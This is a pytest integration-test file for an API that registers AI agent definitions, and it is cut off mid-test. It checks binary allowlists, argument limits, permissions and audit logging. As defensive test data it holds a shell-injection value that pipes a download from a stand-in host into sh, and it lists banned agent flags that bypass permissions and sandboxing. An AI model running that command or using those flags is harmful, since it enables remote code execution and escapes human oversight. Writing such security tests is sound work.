"""API integration tests for agent definitions registry (KB-P5-16)."""

from __future__ import annotations

import uuid
from typing import TYPE_CHECKING

import pytest
from sqlalchemy import text

from kanban.agents.cli_policy import CliPolicyError, assert_runtime_argv
from kanban.agents.schemas import AgentDefinitionCreate, AgentDefinitionPatch
from kanban.agents.service import AgentDefinitionService
from kanban.api.deps import PrincipalContext
from kanban.api.problems import ProblemException

if TYPE_CHECKING:
    from collections.abc import Awaitable, Callable

    import httpx

    from kanban.tests.api.conftest import ApiEnv, SeededUser
    from kanban.tests.contract import ContractRecorder

pytestmark = pytest.mark.committed_db


async def test_case_1_positive_create_cli_pipe_and_codex(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
    contract_recorder: ContractRecorder,
) -> None:
    """Test Case 1: Positive create cli_pipe agent agy and codex, verify AGENT principal & audit."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    # 1. Create agy agent
    agy_payload = {
        "slug": "agy-reviewer",
        "display_name": "AGY Code Reviewer",
        "harness_kind": "cli_pipe",
        "cli_binary_allowlist_id": "agy",
        "cli_args": ["-p"],
        "timeout_ms": 60000,
    }
    resp = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json=agy_payload,
    )
    contract_recorder.record("create_agent_definition_201", resp.request, resp)
    assert resp.status_code == 201, resp.text
    body = resp.json()
    assert body["slug"] == "agy-reviewer"
    assert body["display_name"] == "AGY Code Reviewer"
    assert body["harness_kind"] == "cli_pipe"
    assert body["cli_binary_allowlist_id"] == "agy"
    assert body["cli_args"] == ["-p"]
    assert "Location" in resp.headers
    assert resp.headers["Location"] == f"/api/v1/agent-definitions/{body['id']}"

    # Verify AGENT principal was created
    principal_id = body["principal_id"]
    p_row = (
        (
            await api_env.seed.execute(
                text("SELECT principal_type, display_name FROM principals WHERE id = :pid"),
                {"pid": principal_id},
            )
        )
        .mappings()
        .one()
    )
    assert p_row["principal_type"] == "AGENT"
    assert p_row["display_name"] == "AGY Code Reviewer"

    # Verify activity record was written with argv tuple
    act_row = (
        (
            await api_env.seed.execute(
                text(
                    "SELECT event_type, payload FROM activity_records "
                    "WHERE workspace_id = :wid AND event_type = 'AGENT_DEFINITION_CREATED' "
                    "ORDER BY recorded_at DESC LIMIT 1"
                ),
                {"wid": api_env.workspace_id},
            )
        )
        .mappings()
        .one()
    )
    assert act_row["event_type"] == "AGENT_DEFINITION_CREATED"
    assert act_row["payload"]["argv"] == ["/usr/local/bin/agy", "-p"]
    assert act_row["payload"]["slug"] == "agy-reviewer"

    # 2. Create codex agent with pinned prefix
    codex_payload = {
        "slug": "codex-gate",
        "display_name": "Codex Gate Evaluator",
        "harness_kind": "cli_pipe",
        "cli_binary_allowlist_id": "codex",
        "cli_args": ["exec", "-s", "read-only", "-", "--model", "o3-mini"],
        "timeout_ms": 120000,
    }
    resp_codex = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json=codex_payload,
    )
    assert resp_codex.status_code == 201, resp_codex.text
    body_codex = resp_codex.json()
    assert body_codex["slug"] == "codex-gate"
    assert body_codex["cli_args"] == ["exec", "-s", "read-only", "-", "--model", "o3-mini"]

    # Verify codex activity record has full argv
    act_codex = (
        (
            await api_env.seed.execute(
                text(
                    "SELECT payload FROM activity_records "
                    "WHERE workspace_id = :wid AND event_type = 'AGENT_DEFINITION_CREATED' "
                    "ORDER BY recorded_at DESC LIMIT 1"
                ),
                {"wid": api_env.workspace_id},
            )
        )
        .mappings()
        .one()
    )
    assert act_codex["payload"]["argv"] == [
        "/usr/local/bin/codex",
        "exec",
        "-s",
        "read-only",
        "-",
        "--model",
        "o3-mini",
    ]


@pytest.mark.parametrize(
    "flag",
    [
        "--yolo",
        "--YOLO",
        "--yolo=true",
        "--dangerously-skip-permissions",
        "--dangerously",
        "--dangerously-foo",
        "--full-auto",
        "--allow-all-tools=1",
    ],
)
async def test_case_2_security_banned_flags_table_driven(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
    contract_recorder: ContractRecorder,
    flag: str,
) -> None:
    """Test Case 2: Security table rejection of bypass flags -> 422 BANNED_CLI_FLAG."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    payload = {
        "slug": f"banned-test-{uuid.uuid4().hex[:6]}",
        "display_name": "Banned Agent",
        "harness_kind": "cli_pipe",
        "cli_binary_allowlist_id": "agy",
        "cli_args": ["-p", flag],
    }
    resp = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json=payload,
    )
    if flag == "--yolo":
        contract_recorder.record("banned_cli_flag_422", resp.request, resp)
    assert resp.status_code == 422, resp.text
    problem = resp.json()
    assert problem["code"] == "BANNED_CLI_FLAG"


@pytest.mark.parametrize(
    "codex_args",
    [
        ["exec", "-s", "danger-full-access", "-"],
        ["exec", "-s", "read-only", "-", "-s", "workspace-write"],
        ["exec", "-s", "read-only", "-", "-c", "sandbox_mode=danger-full-access"],
        ["-p", "-s", "read-only"],
    ],
)
async def test_case_3_security_codex_sandbox_override(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
    contract_recorder: ContractRecorder,
    codex_args: list[str],
) -> None:
    """Test Case 3: Reject codex sandbox overrides -> 422 CODEX_SANDBOX_OVERRIDE."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    payload = {
        "slug": f"codex-bypass-{uuid.uuid4().hex[:6]}",
        "display_name": "Codex Override Agent",
        "harness_kind": "cli_pipe",
        "cli_binary_allowlist_id": "codex",
        "cli_args": codex_args,
    }
    resp = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json=payload,
    )
    if codex_args[2] == "danger-full-access":
        contract_recorder.record("codex_sandbox_override_422", resp.request, resp)
    assert resp.status_code == 422, resp.text
    problem = resp.json()
    assert problem["code"] == "CODEX_SANDBOX_OVERRIDE"


async def test_case_3b_security_binary_allowlist(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
    contract_recorder: ContractRecorder,
) -> None:
    """Test Case 3b: Reject non-allowlisted binary -> 422 CLI_BINARY_NOT_ALLOWLISTED."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    payload = {
        "slug": "bash-agent",
        "display_name": "Bash Agent",
        "harness_kind": "cli_pipe",
        "cli_binary_allowlist_id": "bash",
        "cli_args": ["-c", "id"],
    }
    resp = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json=payload,
    )
    contract_recorder.record("cli_binary_not_allowlisted_422", resp.request, resp)
    assert resp.status_code == 422, resp.text
    problem = resp.json()
    assert problem["code"] == "CLI_BINARY_NOT_ALLOWLISTED"


async def test_case_4_security_arg_boundaries_and_opaque_injection(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
    contract_recorder: ContractRecorder,
) -> None:
    """Test Case 4: Opaque injection accepted as single argv; control chars & limits rejected."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    # 1. Shell injection syntax accepted only as opaque element
    opaque_payload = {
        "slug": "opaque-shell-test",
        "display_name": "Opaque Shell Test",
        "harness_kind": "cli_pipe",
        "cli_binary_allowlist_id": "agy",
        "cli_args": ["-p", "$(curl evil.sh|sh)"],
    }
    resp_opaque = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json=opaque_payload,
    )
    assert resp_opaque.status_code == 201, resp_opaque.text
    assert resp_opaque.json()["cli_args"] == ["-p", "$(curl evil.sh|sh)"]

    # 2. Control character (newline) rejected
    nl_payload = {
        "slug": "nl-test",
        "display_name": "Newline Test",
        "harness_kind": "cli_pipe",
        "cli_binary_allowlist_id": "agy",
        "cli_args": ["-p\nls"],
    }
    resp_nl = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json=nl_payload,
    )
    contract_recorder.record("cli_args_invalid_422", resp_nl.request, resp_nl)
    assert resp_nl.status_code == 422, resp_nl.text
    assert resp_nl.json()["code"] == "CLI_ARGS_INVALID"

    # 3. 33 arguments rejected (> 32)
    too_many_args = [f"arg{i}" for i in range(33)]
    resp_many = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "too-many-args",
            "display_name": "Too Many Args",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": too_many_args,
        },
    )
    assert resp_many.status_code == 422, resp_many.text
    assert resp_many.json()["code"] == "CLI_ARGS_INVALID"

    # 4. 257-byte argument rejected
    resp_long = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "too-long-arg",
            "display_name": "Too Long Arg",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["a" * 257],
        },
    )
    assert resp_long.status_code == 422, resp_long.text
    assert resp_long.json()["code"] == "CLI_ARGS_INVALID"


async def test_case_5_runtime_argv_assertion_catches_tampered_records(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
) -> None:
    """Test Case 5: Direct DB tampering with --yolo is detected by assert_runtime_argv."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    resp_create = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "tamper-target",
            "display_name": "Tamper Target",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
        },
    )
    assert resp_create.status_code == 201, resp_create.text
    agent_id = uuid.UUID(resp_create.json()["id"])

    # Directly tamper the row in PostgreSQL via raw SQL to inject --yolo
    await api_env.seed.execute(
        text("UPDATE agent_definitions SET cli_args_json = '[\"--yolo\"]'::jsonb WHERE id = :id"),
        {"id": agent_id},
    )

    tampered_row = (
        (
            await api_env.seed.execute(
                text(
                    "SELECT id, cli_binary_allowlist_id, cli_args_json "
                    "FROM agent_definitions WHERE id = :id"
                ),
                {"id": agent_id},
            )
        )
        .mappings()
        .one()
    )

    # assert_runtime_argv must detect and reject --yolo despite raw SQL tampering
    with pytest.raises(CliPolicyError) as exc_info:
        assert_runtime_argv(tampered_row)
    assert exc_info.value.code == "BANNED_CLI_FLAG"


async def test_case_6_rls_member_denial_and_cross_workspace_404(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
    contract_recorder: ContractRecorder,
) -> None:
    """Test Case 6: MEMBER POST rejected (403), cross-workspace GET returns 404."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    member = await make_user("member", workspace_role="WORKSPACE_MEMBER")

    # 1. Create an agent as admin
    resp_create = await as_principal(admin).post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "rls-agent-1",
            "display_name": "RLS Agent",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
        },
    )
    assert resp_create.status_code == 201, resp_create.text
    assert "id" in resp_create.json()

    # 2. Member tries to create agent -> 403 INSUFFICIENT_CAPABILITY
    resp_member_post = await as_principal(member).post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "member-agent",
            "display_name": "Member Agent",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
        },
    )
    assert resp_member_post.status_code == 403, resp_member_post.text
    assert resp_member_post.json()["code"] == "INSUFFICIENT_CAPABILITY"

    # 3. Requesting agent from another workspace -> 404
    other_ws = uuid.uuid4()
    resp_other = await as_principal(admin).get(f"/api/v1/workspaces/{other_ws}/agent-definitions")
    contract_recorder.record("not_found_cross_workspace_404", resp_other.request, resp_other)
    assert resp_other.status_code == 404, resp_other.text

    # 4. Requesting non-existent agent -> 404
    resp_missing = await as_principal(admin).get(f"/api/v1/agent-definitions/{uuid.uuid4()}")
    assert resp_missing.status_code == 404, resp_missing.text


async def test_case_7_boundary_and_validation(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
    contract_recorder: ContractRecorder,
) -> None:
    """Test Case 7: Boundary checks on slug, timeout, mcp_tools, and harness consistency."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    # 1. Slug too short "a"
    resp_slug_a = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "a",
            "display_name": "A",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
        },
    )
    assert resp_slug_a.status_code == 422, resp_slug_a.text
    assert resp_slug_a.json()["code"] == "HARNESS_FIELDS_INVALID"

    # 2. Slug starting with hyphen "-abc"
    resp_slug_hyphen = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "-abc",
            "display_name": "Hyphen",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
        },
    )
    assert resp_slug_hyphen.status_code == 422, resp_slug_hyphen.text
    assert resp_slug_hyphen.json()["code"] == "HARNESS_FIELDS_INVALID"

    # 3. Timeout 999 rejected
    resp_t999 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "t999-agent",
            "display_name": "Timeout 999",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
            "timeout_ms": 999,
        },
    )
    assert resp_t999.status_code == 422, resp_t999.text

    # 4. Timeout 600001 rejected
    resp_t600001 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "t600001-agent",
            "display_name": "Timeout 600001",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
            "timeout_ms": 600001,
        },
    )
    assert resp_t600001.status_code == 422, resp_t600001.text

    # 5. Timeout 1000 and 600000 accepted
    resp_t1000 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "t1000-agent",
            "display_name": "Timeout 1000",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
            "timeout_ms": 1000,
        },
    )
    assert resp_t1000.status_code == 201, resp_t1000.text
    assert resp_t1000.json()["timeout_ms"] == 1000

    resp_t600000 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "t600000-agent",
            "display_name": "Timeout 600000",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
            "timeout_ms": 600000,
        },
    )
    assert resp_t600000.status_code == 201, resp_t600000.text
    assert resp_t600000.json()["timeout_ms"] == 600000

    # 6. mcp_allowed_tools containing update_ticket rejected
    resp_tools = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "bad-tool-agent",
            "display_name": "Bad Tool Agent",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
            "mcp_allowed_tools": ["search_tickets", "update_ticket"],
        },
    )
    assert resp_tools.status_code == 422, resp_tools.text
    assert resp_tools.json()["code"] == "HARNESS_FIELDS_INVALID"

    # 7. in_app_sdk without provider_kind rejected
    resp_sdk_no_prov = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "sdk-no-prov",
            "display_name": "SDK No Provider",
            "harness_kind": "in_app_sdk",
            "model_id": "gemini-2.5-flash",
        },
    )
    contract_recorder.record(
        "harness_fields_invalid_422", resp_sdk_no_prov.request, resp_sdk_no_prov
    )
    assert resp_sdk_no_prov.status_code == 422, resp_sdk_no_prov.text
    assert resp_sdk_no_prov.json()["code"] == "HARNESS_FIELDS_INVALID"

    # 8. in_app_sdk with provider_kind and model_id accepted
    resp_sdk_ok = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "gemini-sdk-agent",
            "display_name": "Gemini SDK Agent",
            "harness_kind": "in_app_sdk",
            "provider_kind": "gemini",
            "model_id": "gemini-2.5-flash",
        },
    )
    assert resp_sdk_ok.status_code == 201, resp_sdk_ok.text

    # 9. remote_runner with remote_runner_pool_slug accepted
    resp_remote_ok = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "remote-gpu-runner",
            "display_name": "Remote GPU Runner",
            "harness_kind": "remote_runner",
            "remote_runner_pool_slug": "airgapped-cluster-1",
        },
    )
    assert resp_remote_ok.status_code == 201, resp_remote_ok.text


async def test_case_8_delete_and_agent_in_use(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
    contract_recorder: ContractRecorder,
) -> None:
    """Test Case 8: Traps FK RESTRICT violations -> 409 AGENT_IN_USE; unreferenced delete -> 204."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    # 1. Create an agent
    resp = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "delete-target-agent",
            "display_name": "Delete Target",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
        },
    )
    assert resp.status_code == 201, resp.text
    agent_id = uuid.UUID(resp.json()["id"])

    # 2. Create a stub table with FK RESTRICT to agent_definitions(id)
    try:
        await api_env.seed.execute(
            text(
                "CREATE TABLE stub_workflow_hooks ("
                "    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),"
                "    agent_definition_id UUID NOT NULL "
                "        REFERENCES agent_definitions(id) ON DELETE RESTRICT"
                ");"
            )
        )
        # Insert a referencing row
        await api_env.seed.execute(
            text("INSERT INTO stub_workflow_hooks (agent_definition_id) VALUES (:aid)"),
            {"aid": agent_id},
        )
        await api_env.seed.commit()

        # 3. Attempt to delete -> 409 AGENT_IN_USE
        resp_del_conflict = await client.delete(f"/api/v1/agent-definitions/{agent_id}")
        contract_recorder.record("agent_in_use_409", resp_del_conflict.request, resp_del_conflict)
        assert resp_del_conflict.status_code == 409, resp_del_conflict.text
        problem = resp_del_conflict.json()
        assert problem["code"] == "AGENT_IN_USE"

        # 4. Remove referencing row and retry delete -> 204
        await api_env.seed.execute(
            text("DELETE FROM stub_workflow_hooks WHERE agent_definition_id = :aid"),
            {"aid": agent_id},
        )
        await api_env.seed.commit()

        resp_del_ok = await client.delete(f"/api/v1/agent-definitions/{agent_id}")
        assert resp_del_ok.status_code == 204, resp_del_ok.text

        # 5. Verify agent is gone -> 404
        resp_get = await client.get(f"/api/v1/agent-definitions/{agent_id}")
        assert resp_get.status_code == 404, resp_get.text

        # Verify AGENT_DEFINITION_DELETED was recorded
        del_act = (
            (
                await api_env.seed.execute(
                    text(
                        "SELECT event_type FROM activity_records "
                        "WHERE workspace_id = :wid AND event_type = 'AGENT_DEFINITION_DELETED' "
                        "ORDER BY recorded_at DESC LIMIT 1"
                    ),
                    {"wid": api_env.workspace_id},
                )
            )
            .mappings()
            .one()
        )
        assert del_act["event_type"] == "AGENT_DEFINITION_DELETED"
    finally:
        await api_env.seed.execute(text("DROP TABLE IF EXISTS stub_workflow_hooks;"))
        await api_env.seed.commit()


async def test_crud_endpoints_get_list_patch(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
) -> None:
    """Test standard CRUD operations: GET by slug/UUID, LIST, and PATCH."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    # 1. Create two agents
    resp1 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "agent-alpha",
            "display_name": "Alpha Agent",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
        },
    )
    assert resp1.status_code == 201, resp1.text
    alpha_id = resp1.json()["id"]

    resp2 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "agent-beta",
            "display_name": "Beta Agent",
            "harness_kind": "in_app_sdk",
            "provider_kind": "openai",
            "model_id": "gpt-4o",
        },
    )
    assert resp2.status_code == 201, resp2.text

    # 2. GET by UUID
    get_by_uuid = await client.get(f"/api/v1/agent-definitions/{alpha_id}")
    assert get_by_uuid.status_code == 200, get_by_uuid.text
    assert get_by_uuid.json()["slug"] == "agent-alpha"

    # 3. GET by slug
    get_by_slug = await client.get("/api/v1/agent-definitions/agent-alpha")
    assert get_by_slug.status_code == 200, get_by_slug.text
    assert get_by_slug.json()["id"] == alpha_id

    # 4. LIST in workspace
    list_resp = await client.get(f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions")
    assert list_resp.status_code == 200, list_resp.text
    items = list_resp.json()
    assert len(items) >= 2
    slugs = [item["slug"] for item in items]
    assert "agent-alpha" in slugs
    assert "agent-beta" in slugs
    # Verify ordering by slug
    assert sorted(slugs) == slugs

    # 5. PATCH agent
    patch_resp = await client.patch(
        f"/api/v1/agent-definitions/{alpha_id}",
        json={
            "display_name": "Updated Alpha Agent",
            "timeout_ms": 90000,
            "cli_args": ["-p", "--verbose"],
        },
    )
    assert patch_resp.status_code == 200, patch_resp.text
    body_patch = patch_resp.json()
    assert body_patch["display_name"] == "Updated Alpha Agent"
    assert body_patch["timeout_ms"] == 90000
    assert body_patch["cli_args"] == ["-p", "--verbose"]

    # Verify AGENT_DEFINITION_UPDATED was recorded
    upd_act = (
        (
            await api_env.seed.execute(
                text(
                    "SELECT event_type, payload FROM activity_records "
                    "WHERE workspace_id = :wid AND event_type = 'AGENT_DEFINITION_UPDATED' "
                    "ORDER BY recorded_at DESC LIMIT 1"
                ),
                {"wid": api_env.workspace_id},
            )
        )
        .mappings()
        .one()
    )
    assert upd_act["event_type"] == "AGENT_DEFINITION_UPDATED"
    assert upd_act["payload"]["argv"] == ["/usr/local/bin/agy", "-p", "--verbose"]


async def test_duplicate_slug_conflict_409(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
) -> None:
    """Duplicate slug in same workspace raises 409 CONFLICT."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    payload = {
        "slug": "unique-slug-1",
        "display_name": "Agent One",
        "harness_kind": "cli_pipe",
        "cli_binary_allowlist_id": "agy",
        "cli_args": ["-p"],
    }
    resp1 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json=payload,
    )
    assert resp1.status_code == 201, resp1.text

    resp2 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json=payload,
    )
    assert resp2.status_code == 409, resp2.text
    assert resp2.json()["code"] == "CONFLICT"


async def test_workspace_slug_lookup(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
) -> None:
    """Listing using workspace slug succeeds, invalid slug returns 404."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    # Get workspace slug from database
    ws_slug = (
        await api_env.seed.execute(
            text("SELECT slug FROM workspaces WHERE id = :wid"),
            {"wid": api_env.workspace_id},
        )
    ).scalar_one()

    # Create an agent
    resp = await client.post(
        f"/api/v1/workspaces/{ws_slug}/agent-definitions",
        json={
            "slug": "slug-ws-agent",
            "display_name": "Slug WS Agent",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
        },
    )
    assert resp.status_code == 201, resp.text

    # List using workspace slug
    list_resp = await client.get(f"/api/v1/workspaces/{ws_slug}/agent-definitions")
    assert list_resp.status_code == 200, list_resp.text
    assert any(a["slug"] == "slug-ws-agent" for a in list_resp.json())

    # Non-existent workspace slug -> 404
    resp_bad = await client.get("/api/v1/workspaces/non-existent-ws-slug/agent-definitions")
    assert resp_bad.status_code == 404, resp_bad.text


async def test_project_scoped_agent_lifecycle(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    make_project: Callable[..., Awaitable[uuid.UUID]],
    as_principal: Callable[..., httpx.AsyncClient],
) -> None:
    """Project-scoped agent definition permissions and CRUD."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    project_id = await make_project("PROJ", created_by=admin)

    client = as_principal(admin)

    # Create project-scoped agent
    resp = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "proj-agent",
            "display_name": "Project Agent",
            "project_id": str(project_id),
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
        },
    )
    assert resp.status_code == 201, resp.text
    assert resp.json()["project_id"] == str(project_id)
    agent_id = resp.json()["id"]

    # Patch project-scoped agent
    patch_resp = await client.patch(
        f"/api/v1/agent-definitions/{agent_id}",
        json={"display_name": "Updated Proj Agent"},
    )
    assert patch_resp.status_code == 200, patch_resp.text
    assert patch_resp.json()["display_name"] == "Updated Proj Agent"

    # Delete project-scoped agent
    del_resp = await client.delete(f"/api/v1/agent-definitions/{agent_id}")
    assert del_resp.status_code == 204, del_resp.text


async def test_schema_validations_on_create(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
) -> None:
    """Comprehensive branch coverage for schema validations on create."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    # 1. in_app_sdk with cli_binary_allowlist_id rejected
    resp1 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "sdk-with-bin",
            "display_name": "SDK Bin",
            "harness_kind": "in_app_sdk",
            "provider_kind": "openai",
            "model_id": "gpt-4o",
            "cli_binary_allowlist_id": "agy",
        },
    )
    assert resp1.status_code == 422, resp1.text
    assert resp1.json()["code"] == "HARNESS_FIELDS_INVALID"

    # 2. cli_pipe without cli_binary_allowlist_id rejected
    resp2 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "pipe-no-bin",
            "display_name": "Pipe No Bin",
            "harness_kind": "cli_pipe",
        },
    )
    assert resp2.status_code == 422, resp2.text
    assert resp2.json()["code"] == "HARNESS_FIELDS_INVALID"

    # 3. cli_pipe with remote_runner_pool_slug rejected
    resp3 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "pipe-with-remote",
            "display_name": "Pipe Remote",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "remote_runner_pool_slug": "pool-1",
        },
    )
    assert resp3.status_code == 422, resp3.text
    assert resp3.json()["code"] == "HARNESS_FIELDS_INVALID"

    # 4. remote_runner without remote_runner_pool_slug rejected
    resp4 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "remote-no-pool",
            "display_name": "Remote No Pool",
            "harness_kind": "remote_runner",
        },
    )
    assert resp4.status_code == 422, resp4.text
    assert resp4.json()["code"] == "HARNESS_FIELDS_INVALID"

    # 5. system_instructions_md > 65536 bytes rejected on create
    resp5 = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "big-instructions",
            "display_name": "Big Instructions",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "system_instructions_md": "x" * 65537,
        },
    )
    assert resp5.status_code == 422, resp5.text
    assert resp5.json()["code"] == "CLI_ARGS_INVALID"

    # 6. Surrogate character rejected in system_instructions_md via schema model validation
    with pytest.raises(ProblemException) as exc_create_surr:
        AgentDefinitionCreate(
            slug="surrogate-agent",
            display_name="Surrogate Agent",
            harness_kind="cli_pipe",
            cli_binary_allowlist_id="agy",
            system_instructions_md="hello \ud800 world",
        )
    assert exc_create_surr.value.code == "CLI_ARGS_INVALID"


async def test_schema_validations_on_patch(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
    as_principal: Callable[..., httpx.AsyncClient],
) -> None:
    """Comprehensive branch coverage for schema validations on patch."""
    admin = await make_user("admin", workspace_role="WORKSPACE_ADMIN")
    client = as_principal(admin)

    # 1. Create valid agent for patch tests
    agent_resp = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "patch-target",
            "display_name": "Patch Target",
            "harness_kind": "cli_pipe",
            "cli_binary_allowlist_id": "agy",
            "cli_args": ["-p"],
        },
    )
    assert agent_resp.status_code == 201, agent_resp.text
    agent_id = agent_resp.json()["id"]

    # 2. Patch with invalid mcp tool rejected
    patch_bad_tool = await client.patch(
        f"/api/v1/agent-definitions/{agent_id}",
        json={"mcp_allowed_tools": ["search_tickets", "write_code"]},
    )
    assert patch_bad_tool.status_code == 422, patch_bad_tool.text
    assert patch_bad_tool.json()["code"] == "HARNESS_FIELDS_INVALID"

    # 3. Patch with invalid binary allowlist ID rejected
    patch_bad_bin = await client.patch(
        f"/api/v1/agent-definitions/{agent_id}",
